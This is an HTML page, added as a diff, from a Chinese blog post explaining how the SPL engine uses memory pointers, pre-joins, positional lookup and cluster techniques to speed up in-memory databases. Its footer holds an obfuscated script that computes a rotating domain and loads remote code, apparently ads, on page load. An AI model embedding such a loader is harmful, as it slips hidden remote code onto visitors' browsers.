@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>内存数据库如何发挥内存优势？ - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">内存数据库如何发挥内存优势？</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    
+                        
+                    
+                    <p>与以磁盘存储为主的普通数据库相比，内存数据库的数据访问速度可以高出几个数量级，能大幅提高运算性能，更适合高并发、低延时的业务场景。</p> 
+<p>不过，当前大部分内存数据库仍然采用 SQL 模型，而 SQL 缺乏一些必要的数据类型和运算，不能充分利用内存的特征实现某些高性能算法。仅仅是把外存的数据和运算简单地搬进内存，固然也能获得比外存好得多的性能，但还没有充分利用内存特征，也就不能获得极致的性能。</p> 
+<p>下面我们来看看，有哪些适合内存特征的算法和存储机制，可以进一步提升内存数据库计算速度。</p> 
+<h2>
+<a id="_6"></a>指针式复用</h2> 
+<p>我们知道，内存可以通过地址（指针）来访问。但 SQL 没有用内存指针表示的数据对象，在返回结果集时，通常要把数据复制一份，形成一个新的数据表。这样不仅多消耗 CPU 时间（用于复制数据）而且还会占用更多昂贵的内存空间（用于存储复制的数据），降低内存使用率。</p> 
+<p>除了 SQL 型的内存数据库外，Spark 中的 RDD 也有这个问题，而且情况更严重。为了保持 RDD 的 immutable 特性，Spark 在每个计算步骤后都会复制出新的 RDD，造成内存和 CPU 的大量浪费。所以，即使耗用了巨大资源，Spark 也仍然做不到高性能。相比之下，SQL 型的内存数据库通常还会优化，在 SQL 语句中的计算会尽量使用内存地址，通常要比 Spark 的性能更好。</p> 
+<p>但是，受到理论限制，实现 SQL 的逻辑时，返回的结果集就必须复制了。如果涉及多步骤的过程运算，要多次在上一步的结果集（临时表）基础上进一步计算，SQL 的劣势就会很明显了。</p> 
+<p>事实上，如果没有改变数据结构，我们可以直接用原数据的地址形成结果集，不需要复制数据本身，仅仅多保存一个地址（指针），同时减少 CPU 和内存的消耗。</p> 
+<p>SPL 扩展了 SQL 的数据类型，支持这种<strong>指针式复用</strong>机制。比如，对订单表按照订单日期（odate）范围过滤后，分别求出订单金额（amount1）大于 1000 和运货费（amount2）大于 1000 的订单，再计算出两者的交集、并集和差集，最后将差集按照客户号（cid）排序。SPL 代码大致是这样：</p> 
+<table>
+<thead><tr>
+<th></th>
+<th>A</th>
+<th>B</th>
+</tr></thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>=orders.select(odate&gt;=date(2000,1,1) &amp;&amp; odate&lt;=date(2022,1,1))</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>=A1.select(amount1&gt;1000)</td>
+<td>=A1.select(amount2&gt;1000)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>=A2^B2</td>
+<td>=A2&amp;B2</td>
+</tr>
+<tr>
+<td>4</td>
+<td>=A2B2</td>
+<td>=B2A2</td>
+</tr>
+<tr>
+<td>5</td>
+<td>=A4.sort(cid)</td>
+<td>=B4.sort(cid)</td>
+</tr>
+<tr>
+<td>以上代码中有好几个步骤，有的中间结果也被用了多次，但由于使用的都是订单表记录的指针，所以内存占用增加的很少，也避免了记录复制的耗时。</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2>
+<a id="_27"></a>外键预关联</h2> 
+<p>外键关联是指用一个表（事实表）的非主键字段，去关联另一个表（维表）的主键。比如订单表中的客户号和产品号分别关联客户表、产品表的主键。现实运算中这种关联可能多达七八个甚至十几个表，还可能出现多层的关联。SQL 数据库通常使用 HASH JOIN 算法来做内存连接，需要计算和比对 HASH 值，过程中还会占用内存来存储中间结果，关联表很多时计算性能就会急剧下降。</p> 
+<p>其实，我们也可以利用内存指针引用机制事先做好关联。在系统初始化阶段，把事实表中的关联字段值转换为对应维表记录的指针。因为维表的关联字段是主键，所以关联记录唯一，将外键值转换成记录指针不会引起错误。在后续计算中，需要引用维表字段时，可以用指针直接引用，无需计算和比对 HASH 值，也不需要再存储中间结果，从而获得更优的性能。SQL 没有记录指针这种数据类型，也就无法实现预关联了。</p> 
+<p>SPL 则从原理上支持并实现了这种<strong>预关联</strong>机制。例如，完成订单表和客户表、产品表预关联的代码大致是这样：</p> 
+<table>
+<thead><tr>
+<th></th>
+<th>A</th>
+</tr></thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>=file(“customer.btx”).import@b().keys@i(cid)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>=file(“product.btx”).import@b().keys@i(pid)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>=file(“orders.btx”).import@b().switch(cid,A1;pid,A2)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>&gt;env(orders,A3)</td>
+</tr>
+</tbody>
+</table>
+<p>A1、A2 加载客户表和产品表。</p> 
+<p>A3：加载订单表，将其中的客户号 cid、产品号 pid 转换为对应维表记录的指针。</p> 
+<p>A4：将完成预关联的订单表存入全局变量，供后续计算使用。</p> 
+<p>系统运行时，按照产品供应商过滤订单，再按客户所在城市分组汇总的代码大致是下面这样：</p> 
+<table>
+<thead><tr>
+<th></th>
+<th>A</th>
+</tr></thead>
+<tbody><tr>
+<td>1</td>
+<td>=orders.select(pid.supplier==“raqsoft.com”).groups(cid.city;sum(pid.price*quantity))</td>
+</tr></tbody>
+</table>
+<p>订单表中的 pid 已经转换为产品表记录的指针，所以可以直接用“.”操作符引用产品表记录。 不仅书写更简单，而且运算性能也快得多。</p> 
+<p>只是两、三个表关联时，预关联和 HASH JOIN 的差别还不是非常明显。这是因为关联并不是最终目的，之后还会有其它很多运算，关联本身运算消耗时间的占比相对不大。但如果关联情况比较复杂，涉及的表很多，以及有多层的时候（比如订单关联产品，产品关联供应商，供应商关联城市，城市关联国家等等），预关联的性能优势会更明显。</p> 
+<h2>
+<a id="_58"></a>序号定位</h2> 
+<p>与外存相比，内存的另一个重要特征是支持高速的随机访问，可以快速从内存表中按指定序号（也就是位置）取出数据。在做查找计算时，如果被查找的值正好是目标值在内存表中的序号，或者很容易通过被查找值计算出目标值的序号，我们就可以用序号直接取目标记录。这种方法不需要进行任何比对就能直接取出查找结果，性能不仅远远好于遍历查找，也好于使用索引的查找算法。</p> 
+<p>但是，SQL 以无序集合为基础，不能按序号取成员，只能用序号去查找。如果没有索引就只能遍历查找，会非常慢。即使有索引也要计算 HASH 值或用二分法查找，速度也比不上直接定位。而且，建立索引也会占用昂贵的内存。如果数据表中没有序号还要先排序再硬造个序号时，性能就会更差。</p> 
+<p>SPL 以有序集合为基础，提供<strong>序号定位</strong>功能。比如订单表中的订单号是从 1 开始的自然数。在查找订单号 i 时，直接取订单表中的第 i 条记录就行了。再比如数据表 T 从 2000 年到 2022 年每天存储一条数据，现在需要查询指定日期的记录。日期虽然不是目标值的序号，但是我们可以先算出指定日期距离起始日期的天数。这就是目标值的序号，然后再用序号取 T 表记录就可以了。对表 T 用序号定位查找 2022 年 4 月 20 日记录的代码，大致是下面这样：</p> 
+<table>
+<thead><tr>
+<th></th>
+<th>A</th>
+</tr></thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>=date(2022,12,31)-date(1999,12,31)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>=T_orginal.align@b(to(A1),dt-date(1999,12,31))</td>
+</tr>
+<tr>
+<td>3</td>
+<td>=env(T,A5)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>=T(date(2021,4,20)-date(1999,12,31))</td>
+</tr>
+</tbody>
+</table>
+<p>A1：计算出 2000 年到 2022 年总天数是 8401 天。</p> 
+<p>A2：用原始的 T 表记录计算出距离起始日期的天数，再和 to(A1)这个自然数集合 [1,2,3,…,8401] 对齐，空缺的日期会用 null 补齐。align 的 @b 选项表示对齐时将使用二分法来查找位置，这样完成对齐动作也会更快一点。</p> 
+<p>A3：计算好的结果，放到全局变量 T 中。</p> 
+<p>A4：要查找 2021 年 4 月 20 日记录，求出这个日期和起始日期距离 7781 天，直接取出 T 表中第 7781 条记录就可以了。</p> 
+<p>A1 到 A3 是对齐计算，用于处理空缺的日期，可以放在系统初始化阶段。在查找计算时，用 A4 中的序号定位代码就能得到查找结果，实际查找的日期可以作为参数传入。</p> 
+<h2>
+<a id="_83"></a>集群维表</h2> 
+<p>当数据量太大，超出单机内存时，就要使用集群来加载这些数据。许多内存数据库也支持分布式计算，通常是将数据分成多段，分别加载到集群不同分机的内存中。</p> 
+<p>JOIN 是分布式计算的一个麻烦任务，会涉及多个分机之间的数据传输。严重的时候，传输造成的延迟会抵消集群分摊计算量得到的好处，会出现集群变大反而性能并不能提升的现象。</p> 
+<p>SQL 体系下的分布式数据库，通常是将单机 HASH JOIN 方法扩展到集群上。每个分机根据 HASH 值将本机数据分发到其他分机，确保相关联的数据在同一分机上。然后再在各个分机上做单机连接。但是，HASH 方法在运气不好的时候，可能会造成数据分配的严重不均衡，需要借助外存来缓存这些分发到的数据，否则可能因为内存溢出而导致系统崩溃。但是，内存数据库的主要特征就是将数据加载到内存中计算，出现外存缓存会严重拖慢计算性能。</p> 
+<p>实际上，外键关联的事实表和维表有很大区别。事实表一般都比较大，要用各个分机内存分段加载才能装的下。正好事实表也比较适合分段，每个分段的数据都相互独立，分机之间不需要相互访问。而维表记录则会被随机访问，事实表的任何一个分段都可能关联全部维表记录。我们可以利用事实表和维表的区别，对集群的外键关联提速。</p> 
+<p>如果维表比较小，则将维表全量数据复制到所有分机内存中。这样，每个分机中的事实表分段和全量维表就可以继续完成预关联，完全避免了关联过程中的网络传输。</p> 
+<p>如果维表也很大，单机内存放不下，只能在各分机内存中分段加载。这时，没有一个分机上有全量的维表，外键关联计算就无法避免网络传输了。不过传输内容并不算很大，只涉及事实表的外键和维表关联记录的字段，事实表其它字段不需要传输，计算可以直接完成，过程中也不会产生缓存数据。</p> 
+<p>SPL 从原理上区分维表和事实表，针对维表较小和维表较大两种情况，分别提供了<strong>维表复制</strong>机制和<strong>分段维表</strong>机制，实现了上述算法，能显著提高集群情况下外键关联的计算性能。</p> 
+<h2>
+<a id="_99"></a>备胎式容错</h2> 
+<p>集群系统必须要考虑容错，内存数据的容错和外存是不同的。外存一般使用副本的方法，即同一份数据有多个副本，某个分机失效后仍然能在其它分机找到数据。这种机制的存储利用率很低，只有 1/k（k 是副本数量）。</p> 
+<p>但是，对于内存中的数据，却不能使用这种副本容错方法。这是因为硬盘足够便宜且几乎可以无限扩容，但是内存要昂贵的多而且扩容有上限。只有 1/k 的内存利用率是无法容忍的。</p> 
+<p>内存容错需要不同于外存的专门手段。SPL 提供了<strong>备胎式容错</strong>机制，将数据分成 n 段后分别加载到 n 个分机的内存中。然后准备 k 个空闲的分机作为备用机。当正在运行的某个分机失效时，则立即启用某个备用机，临时加载失效分机的数据，和其它分机重新组成拥有完整数据的集群继续提供服务。失效的分机排除故障后恢复使用，可以再充当备用机。整个过程和汽车更换备胎的模式很像。</p> 
+<p>备胎式容错机制的内存利用率可以高达 n/(n+k)，远远高于副本式容错的 1/k。能加载进内存的数据量通常不会非常大，分机失效后临时加载的时间并不多，集群服务就可以较快地恢复。</p> 
+<h2>
+<a id="_109"></a>回顾与总结</h2> 
+<p>内存数据库的计算体系，必须充分利用内存的特征才能获得极致性能。从数据计算的角度来看，内存主要优点有：支持指针引用、支持高速随机访问、并发读取能力强。内存的缺点是：成本高昂、扩容有上限。</p> 
+<p>而 SQL 计算体系中缺乏一些必要的数据类型和运算，比如：缺少记录指针类型，不支持有序运算，JOIN 定义过于笼统，不区分 JOIN 类型等，从原理上就不能充分利用内存的上述特征实现某些高速算法。基于 SQL 的内存数据库，通常只是简单的照搬外存数据结构和运算，会出现各种问题。比如：记录式复制过多消耗 CPU 和内存；查找和 JOIN 性能没有达到极致。再比如集群方面：内存利用率过低；大量网络传输导致分机数量增加但性能反而下降；多机 JOIN 出现外存缓存等等。</p> 
+<p>开源数据计算引擎 SPL 扩展了数据类型和运算定义，可以充分利用内存的特征，从而实现多种高性能算法，让性能达到极致。其中，<strong>指针式复用</strong>利用内存特有的指针引用机制，节省了内存空间，而且速度更快。<strong>预关联</strong>同样利用指针引用机制，在初始化阶段完成很耗时的外键关联，后续计算中直接使用关联好的结果，计算速度显著提高。<strong>序号定位</strong>利用有序性，充分发挥内存高速随机访问的优势，不用做任何计算和比对，直接用序号读取记录，性能好于 HASH 索引等查找算法。<strong>集群维表</strong>有效避免或减少了网络传输、避免了外存缓存，<strong>备胎式容错</strong>在保证高可用性的前提下，有效提高了集群内存利用率。</p> 
+<p>除此之外，SPL 还提供了<strong>排号键</strong>、<strong>序号索引</strong>、<strong>数据类型压缩</strong>等等其它方法。程序员可以根据具体的场景，有针对性的采用这些方法，就能充分发挥内存的优势，从而有效提升内存数据计算的性能。</p> 
+<h2>
+<a id="SPL_119"></a>SPL资料</h2> 
+<ul>
+<li><a href="http://www.scudata.com.cn">SPL官网</a></li>
+<li><a href="http://c.raqsoft.com.cn/article/1595816810031">SPL下载</a></li>
+<li><a href="https://github.com/SPLWare/esProc">SPL源代码</a></li>
+</ul> 
+<p><img src="https://images2.imgbox.com/f2/80/XQbGHedm_o.png" alt="SPL交流群"></p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
